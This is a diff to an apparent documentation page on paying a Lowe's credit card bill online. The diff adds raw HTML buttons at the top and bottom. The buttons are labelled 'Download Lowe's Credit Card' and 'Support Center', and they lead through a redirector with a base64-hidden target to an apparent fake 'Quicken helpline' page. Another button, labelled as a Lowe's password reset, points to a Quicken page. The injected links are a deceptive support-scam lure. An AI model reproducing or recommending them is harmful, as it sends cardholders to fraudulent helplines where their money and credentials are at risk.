@@ -1,5 +1,12 @@
 How to Pay Your Lowe’s Credit Card Bill Online
 ==============================================
+.. raw:: html
+
+    <div style="text-align:center; margin-top:30px;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+            Download Lowe’s Credit Card
+        </a>
+    </div>
 
 Paying your Lowe’s credit card bill online is fast, secure, and simple through lowes.syf.com. After logging into your account, you can view your balance, schedule payments, and even set up AutoPay. You’ll need a valid checking or savings account to make a payment. The site also offers mobile access and the MySynchrony app for on-the-go account management. If you're new, you can easily register at lowes.syf.com. Staying on top of payments helps you avoid late fees and keeps your account in good standing.
 
@@ -101,3 +108,19 @@ Final Thoughts
 Paying your Lowe’s credit card bill online is simple, fast, and helps you stay in control of your finances. By using the Synchrony portal at Lowes.SYF.com, you can make secure payments anytime—whether you’re at home, at work, or on the go.
 
 Want to save time every month? Set up AutoPay so you never have to worry about missing a due date again!
+
+✅ **Quick Links:**
+
+.. raw:: html
+
+    <div style="text-align:center; margin-top:30px;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+            🔗 Download Lowes Credit Card
+        </a>
+        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+            🔗 Lowes Credit Card Support Center
+        </a>
+        <a href="https://www.quicken.com/my-account/forgot-password" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+            🔗 Reset Lowes Credit Card  Password
+        </a>
+    </div>
